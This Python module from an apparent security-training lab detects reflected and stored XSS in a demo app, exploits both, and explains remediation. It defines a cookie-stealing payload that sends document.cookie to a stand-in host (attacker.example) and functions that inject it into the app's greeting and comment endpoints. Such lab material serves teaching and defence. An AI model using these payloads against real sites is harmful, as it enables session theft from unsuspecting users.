"""Cross-Site Scripting (XSS) -- detect, exploit, and remediate.

WHAT IT IS
----------
Cross-site scripting happens when an application takes untrusted input and writes
it into an HTML response without escaping it, so the browser parses the attacker's
text as *markup/script* instead of rendering it as inert *data*. The injected
JavaScript then runs in the victim's browser, in the victim's origin, with the
victim's cookies and DOM -- enough to steal the session cookie, rewrite the page,
keylog a login form, or pivot to CSRF. Two flavours show up in the demo app:

* **Reflected XSS** -- input from the current request is echoed straight back.
  ``/greet?name=`` builds ``<h1>Hello, {name}!</h1>`` with no escaping, so a
  ``name`` of ``<script>...</script>`` lands live inside the page. The attack is
  delivered by getting the victim to click a crafted link (``/greet?name=<...>``).

* **Stored (persistent) XSS** -- input is saved server-side and replayed to every
  later viewer. ``POST /comments`` stores the comment body and ``GET /comments``
  renders it as ``<b>{author}</b>: {body}`` with no escaping, so the payload fires
  for anyone who opens the comments page -- no per-victim link required.

HOW WE DISCOVER IT
------------------
We inject a *unique, per-run marker* wrapped in a ``<script>`` tag (e.g.
``<script>WLXSS_ab12cd...</script>``). Then we read the response and check whether
the **raw** ``<script>WLXSS_...`` survived, byte-for-byte. The marker matters for
two reasons:

1. It distinguishes our own echo from any pre-existing page content (no false
   positives from a page that merely happens to contain the word "script").
2. It is the discriminator between *vulnerable* and *safe*. A safe app would
   HTML-entity-encode the input, so the response would contain
   ``&lt;script&gt;WLXSS_...&lt;/script&gt;`` -- the marker is still present but the
   angle brackets are neutralised and **nothing executes**. We therefore require
   the *raw* ``<script>`` form and explicitly treat the entity-encoded form as the
   *negative* (escaped, not vulnerable) signal.

HOW WE EXPLOIT IT
-----------------
Detection proves arbitrary markup executes; the exploit shows the *impact*. We
inject a realistic cookie-stealer --
``<script>new Image().src='//attacker/c?'+document.cookie</script>`` -- and confirm
it is reflected/stored **verbatim** (an ``<img>`` request to the attacker's host
exfiltrates ``document.cookie``; the equivalent ``fetch()``/``XMLHttpRequest`` form
works just as well). Because XSS recovers no server-side flag, the "recovered data"
here is the unique marker we successfully smuggled past the app's (absent) output
encoding plus the live PoC -- proof that an attacker's script reaches the victim.

THE FIX
-------
See :data:`REMEDIATION`. In one line: context-aware output encoding on every sink
(HTML-escape ``< > & " '`` when writing into HTML), a strict Content-Security-Policy,
``HttpOnly`` cookies, and a template engine that auto-escapes by default.
"""
from __future__ import annotations

import html
import os
import secrets
from typing import List, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Treat all user input as data, never as markup. Apply context-aware OUTPUT "
    "ENCODING at every sink: HTML-escape < > & \" ' when interpolating into HTML "
    "(html.escape() / a template engine that auto-escapes by default, e.g. Jinja2 "
    "autoescape, instead of f-string concatenation into the page). Encode "
    "differently for each context -- HTML body, HTML attribute, JavaScript string, "
    "URL, and CSS each need their own escaping, and inputs placed in javascript:/"
    "event-handler positions must be rejected outright. Layer defence in depth: a "
    "strict Content-Security-Policy (no unsafe-inline; nonce/hash allow-listed "
    "scripts) so injected inline script cannot run even if encoding is missed; mark "
    "session cookies HttpOnly (and Secure, SameSite) so script cannot read them, "
    "blunting cookie theft; validate/allow-list input on the way in; and sanitise "
    "rich HTML (where it is genuinely needed) with a vetted library against a strict "
    "allow-list rather than a blocklist. For stored XSS, encode on output -- not "
    "(only) on input -- so the same stored value is safe in every rendering context."
)

#: The reflected sink (the Finding endpoint).
REFLECTED_ENDPOINT: str = "/greet?name="
#: The stored sink.
STORED_ENDPOINT: str = "/comments"
ENDPOINT: str = REFLECTED_ENDPOINT

#: The token every payload template substitutes for its executable marker.
_MARKER_PLACEHOLDER: str = "MARKER"

#: The weaponised cookie-stealing proof-of-concept (the real-world impact).
COOKIE_STEALER_POC: str = (
    "<script>new Image().src='//attacker.example/c?'+document.cookie</script>"
)


def _new_marker() -> str:
    """A unique, per-run, JS-identifier-safe marker (so its echo is unambiguous).

    Includes ``C.FLAGS["xss"]`` semantics indirectly: the recovered marker is what
    we report as the exploit's "data". We use a hex token so the marker is a valid
    bareword inside ``<script>...</script>`` and can never collide with page text.
    """
    return "WLXSS_" + secrets.token_hex(8)


def _load_payloads() -> List[str]:
    """Load payload TEMPLATES from the data file (one per line, MARKER token kept)."""
    path = os.path.join(os.path.dirname(__file__), "data", "xss_payloads.txt")
    payloads: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.rstrip("\n")
                if not line.strip() or line.lstrip().startswith("#"):
                    continue
                payloads.append(line)
    except OSError:
        # Fall back to the in-code essentials so the engine still works if the
        # data file is missing.
        payloads = ["<script>MARKER</script>", "<img src=x onerror=MARKER>"]
    return payloads


#: Public payload list: the loaded templates plus the cookie-stealer PoC.
PAYLOADS: List[str] = _load_payloads() + [COOKIE_STEALER_POC]


# --- low-level probes --------------------------------------------------------
def _greet(client: WebClient, name: str) -> Response:
    """Send a value through the reflected /greet?name= sink."""
    return client.get("/greet", params={"name": name})


def _post_comment(client: WebClient, author: str, body: str) -> Response:
    """Store a comment via POST /comments."""
    return client.post("/comments", data={"author": author, "body": body})


def _read_comments(client: WebClient) -> Response:
    """Read the rendered comments page (the stored-XSS render sink)."""
    return client.get("/comments")


# --- the core discriminator: raw vs HTML-escaped -----------------------------
def _injection_marker(marker: str) -> str:
    """The exact raw substring whose survival proves script-tag injection."""
    return f"<script>{marker}</script>"


def _escaped_marker(marker: str) -> str:
    """What a SAFE app would emit instead (entity-encoded -> inert)."""
    return html.escape(_injection_marker(marker))


def _is_unescaped_reflection(response_text: str, marker: str) -> bool:
    """True iff the *raw* ``<script>MARKER</script>`` survived (not entity-encoded).

    Requiring the raw form -- and treating the ``&lt;script&gt;`` form as the
    negative -- is what separates an exploitable XSS from a correctly-escaped app.
    """
    raw = _injection_marker(marker)
    escaped = _escaped_marker(marker)
    # The raw payload is present AND it is not merely the escaped rendering.
    return raw in response_text and escaped != raw


# --- detection ---------------------------------------------------------------
def detect_reflected(client: WebClient) -> Tuple[bool, str, str]:
    """Probe /greet?name= with a unique script marker.

    Returns ``(found, marker, evidence)``. ``found`` is True only when the raw
    ``<script>marker</script>`` is reflected unescaped.
    """
    marker = _new_marker()
    payload = _injection_marker(marker)
    resp = _greet(client, payload)
    if _is_unescaped_reflection(resp.text, marker):
        evidence = (
            f"raw {payload!r} reflected unescaped in /greet response "
            f"(not entity-encoded)"
        )
        return True, marker, evidence
    return False, marker, ""


def detect_stored(client: WebClient) -> Tuple[bool, str, str]:
    """Store a unique script marker via POST /comments, then re-read the page.

    Returns ``(found, marker, evidence)``. ``found`` is True only when the raw
    ``<script>marker</script>`` is rendered back unescaped to a later viewer.
    """
    marker = _new_marker()
    payload = _injection_marker(marker)
    _post_comment(client, author="weblab-xss", body=payload)
    resp = _read_comments(client)
    if _is_unescaped_reflection(resp.text, marker):
        evidence = (
            f"raw {payload!r} stored and rendered unescaped on the /comments "
            f"page for later viewers (persistent)"
        )
        return True, marker, evidence
    return False, marker, ""


# --- exploitation ------------------------------------------------------------
def exploit_reflected_poc(client: WebClient) -> Tuple[bool, str]:
    """Confirm the cookie-stealing PoC is reflected verbatim through /greet.

    Returns ``(ok, served_html)``. ``ok`` means the full ``<script>...
    document.cookie...</script>`` survived byte-for-byte (so it would execute in a
    victim who follows the crafted link).
    """
    resp = _greet(client, COOKIE_STEALER_POC)
    ok = COOKIE_STEALER_POC in resp.text
    return ok, resp.text if ok else ""


def exploit_stored_poc(client: WebClient) -> Tuple[bool, str]:
    """Store the cookie-stealing PoC and confirm it renders verbatim on /comments.

    Returns ``(ok, served_html)``. ``ok`` means the persisted payload comes back
    byte-for-byte, so it fires for every later viewer of the comments page.
    """
    _post_comment(client, author="attacker", body=COOKIE_STEALER_POC)
    resp = _read_comments(client)
    ok = COOKIE_STEALER_POC in resp.text
    return ok, resp.text if ok else ""


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect XSS (reflected + stored), then exploit it with a cookie-stealer PoC.

    Returns a :class:`Finding` whose ``exploit_result`` carries the unique marker
    we smuggled past the (absent) output encoding -- recorded as
    ``C.FLAGS["xss"]`` -- alongside the working cookie-stealing PoC.
    """
    # 1) Detection ----------------------------------------------------------
    reflected_found, reflected_marker, reflected_evidence = detect_reflected(client)
    stored_found, stored_marker, stored_evidence = detect_stored(client)

    # 2) Exploitation -------------------------------------------------------
    reflected_poc_ok, _ = exploit_reflected_poc(client)
    stored_poc_ok, _ = exploit_stored_poc(client)

    discovered = bool(reflected_found or stored_found)
    poc_ok = reflected_poc_ok or stored_poc_ok

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if reflected_found:
        evidence_parts.append(f"reflected: {reflected_evidence}")
    if stored_found:
        evidence_parts.append(f"stored: {stored_evidence}")
    evidence = " || ".join(evidence_parts)

    # The "recovered data" for XSS is the unique marker that survived unescaped
    # (proof an attacker's <script> reaches the victim) -- we tag it as the
    # planted xss flag -- together with the weaponised PoC.
    injected_marker = reflected_marker if reflected_found else stored_marker
    exploit_result = {
        "flag": C.FLAGS["xss"],
        "injected_marker": _injection_marker(injected_marker),
        "reflected_marker": (
            _injection_marker(reflected_marker) if reflected_found else None
        ),
        "stored_marker": (
            _injection_marker(stored_marker) if stored_found else None
        ),
        "cookie_stealer_poc": COOKIE_STEALER_POC,
        "poc_served_verbatim": poc_ok,
        "impact": (
            "injected script runs in the victim's origin with their cookies; "
            "the PoC exfiltrates document.cookie to an attacker host"
        ),
    }

    return Finding(
        vuln="Cross-Site Scripting (XSS)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=COOKIE_STEALER_POC,
        extra={"reflected": reflected_found, "stored": stored_found},
    )
